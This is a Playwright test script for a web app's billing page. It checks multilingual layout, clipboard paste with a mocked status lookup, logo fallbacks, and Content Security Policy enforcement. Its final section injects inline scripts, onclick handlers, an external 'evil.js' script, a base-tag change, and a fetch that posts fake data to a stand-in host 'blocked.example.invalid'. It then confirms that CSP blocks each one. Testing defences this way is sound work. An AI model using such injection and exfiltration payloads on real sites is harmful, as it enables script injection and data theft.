'use strict';
const { chromium } = require('playwright');
const http = require('node:http'), fs = require('node:fs'), path = require('node:path');
const assert = require('node:assert/strict');
// Run with the test environment's Playwright + Chromium. All external requests are mocked.
const root = path.resolve(__dirname, '..');
(async () => {
  const server = http.createServer((req, res) => {
    const file = path.resolve(root, '.' + (new URL(req.url, 'http://localhost').pathname === '/' ? '/index.html' : new URL(req.url, 'http://localhost').pathname));
    if (!file.startsWith(root + path.sep)) { res.writeHead(404); return res.end(); }
    try { res.setHeader('Content-Type', file.endsWith('.html') ? 'text/html; charset=utf-8' : file.endsWith('.svg') ? 'image/svg+xml' : file.endsWith('.png') ? 'image/png' : 'image/jpeg'); res.end(fs.readFileSync(file)); }
    catch { res.writeHead(404); res.end(); }
  });
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  const origin = 'http://127.0.0.1:' + server.address().port;
  let browser;
  try {
    browser = await chromium.launch({ executablePath: '/usr/bin/chromium', headless: true, args: ['--no-sandbox', '--disable-dev-shm-usage'] });
    const context = await browser.newContext({ permissions: ['clipboard-read', 'clipboard-write'] });
    let apiCalls = 0, forbiddenCalls = 0, youtubeCalls = 0;
    await context.route('https://**/*', async route => {
      const url = new URL(route.request().url());
      if (url.hostname === 'redeem.gamepayhub.shop') {
        const headers = { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Headers': 'content-type' };
        if (route.request().method() === 'OPTIONS') return route.fulfill({ status: 204, headers });
        apiCalls++;
        return route.fulfill({ status: 200, headers, contentType: 'application/json', body: JSON.stringify({ ok: true, data: { productName: 'ChatGPT Plus', status: 'used', startDate: null, leftDays: null } }) });
      }
      if (url.hostname === 'www.youtube-nocookie.com') { youtubeCalls++; return route.fulfill({ contentType: 'text/html', body: '<!doctype html><title>Mock video</title>' }); }
      forbiddenCalls++; return route.abort();
    });
    const page = await context.newPage(), errors = [];
    page.on('pageerror', error => errors.push(error.message));
    await page.addInitScript(() => {
      window.cspViolations = [];
      document.addEventListener('securitypolicyviolation', event => window.cspViolations.push(event.effectiveDirective));
    });
    await page.goto(origin + '/#billing', { waitUntil: 'networkidle' });
    for (const locale of ['my', 'en', 'th', 'de', 'fr', 'ja', 'ko']) {
      await page.evaluate(value => { lang = value; applyLang(); }, locale);
      for (const width of [320, 390, 768, 1280, 1440]) {
        await page.setViewportSize({ width, height: 1000 });
        assert(await page.locator('#viewBilling').isVisible());
        const navigation = width <= 600 ? '.bottom-nav' : '.nav .links';
        assert(await page.locator(navigation).isVisible());
        assert(await page.locator(navigation).evaluate(el => [...el.querySelectorAll('a')].every(node => { const b = node.getBoundingClientRect(); return b.left >= 0 && b.right <= innerWidth + 1; })));
        assert(await page.locator('#viewBilling').evaluate(el => [...el.querySelectorAll('input,button,dd,h2')].every(node => { const b = node.getBoundingClientRect(); return b.left >= 0 && b.right <= innerWidth + 1; })));
      }
    }
    assert.deepEqual(await page.evaluate(() => cspViolations), []);
    console.log('PASS: 7 languages / 5 viewport sizes; no normal CSP violations');
    await page.evaluate(() => { lang = 'en'; applyLang(); });
    await page.evaluate(() => navigator.clipboard.writeText('karina-ABCDEFGH'));
    await page.locator('[data-pair-paste="pairClone"]').click();
    await page.waitForFunction(() => document.querySelector('#pairClone').value === 'karina-ABCDEFGH');
    await page.locator('#pairStatusCheck').click();
    await page.waitForFunction(() => document.querySelector('#pairPublicProduct').textContent === 'ChatGPT Plus');
    assert.equal(apiCalls, 1);
    console.log('PASS: Paste and allowed mock relay status lookup');
    await page.evaluate(() => {
      const normal = document.createElement('img'); normal.id = 'missing-normal-logo'; normal.src = '/logos/no-such-normal.png'; document.body.append(normal);
      const gemini = document.createElement('img'); gemini.dataset.logoFallback = 'gemini'; gemini.src = '/logos/no-such-gemini.png';
      const holder = document.createElement('div'); holder.id = 'missing-gemini-logo'; holder.append(gemini); document.body.append(holder);
    });
    await page.waitForFunction(() => !document.querySelector('#missing-normal-logo') && document.querySelector('#missing-gemini-logo i')?.textContent === 'G');
    assert.deepEqual(await page.evaluate(() => cspViolations), []);
    console.log('PASS: dynamic logo fallbacks work without inline event handlers');
    const videoLoaded = page.waitForEvent('requestfinished', { predicate: req => req.url().includes('youtube-nocookie.com') });
    await page.evaluate(() => {
      const frame = document.createElement('iframe'); frame.src = 'https://www.youtube-nocookie.com/embed/FAKEVIDEO01'; document.body.append(frame);
    });
    await videoLoaded;
    assert.equal(youtubeCalls, 1);
    assert.deepEqual(await page.evaluate(() => cspViolations), []);
    console.log('PASS: approved video frame origin remains allowed (mock only)');
    await page.evaluate(async () => {
      const script = document.createElement('script'); script.textContent = 'window.injectedScriptRan = true'; document.body.append(script);
      const button = document.createElement('button'); button.setAttribute('onclick', 'window.injectedHandlerRan = true'); document.body.append(button); button.click();
      const external = document.createElement('script'); external.src = 'https://blocked.example.invalid/evil.js'; document.body.append(external);
      const base = document.createElement('base'); base.href = 'https://blocked.example.invalid/'; document.head.append(base);
      const image = document.createElement('img'); image.src = 'https://blocked.example.invalid/leak.png'; document.body.append(image);
      try { await fetch('https://blocked.example.invalid/leak', { method: 'POST', body: 'FAKE-ONLY-DATA' }); } catch {}
    });
    await page.waitForFunction(() => ['script-src-elem', 'script-src-attr', 'base-uri', 'img-src', 'connect-src'].every(rule => cspViolations.includes(rule)));
    assert.equal(await page.evaluate(() => !!window.injectedScriptRan || !!window.injectedHandlerRan), false);
    assert.equal(await page.evaluate(() => document.baseURI), origin + '/#billing');
    assert.equal(forbiddenCalls, 0);
    assert.deepEqual(errors, []);
    console.log('PASS: injected scripts/handlers, unapproved network/image and base URL changes blocked before network');
    await context.close();
  } finally { if (browser) await browser.close(); await new Promise(resolve => server.close(resolve)); }
})().catch(error => { console.error(error); process.exitCode = 1; });
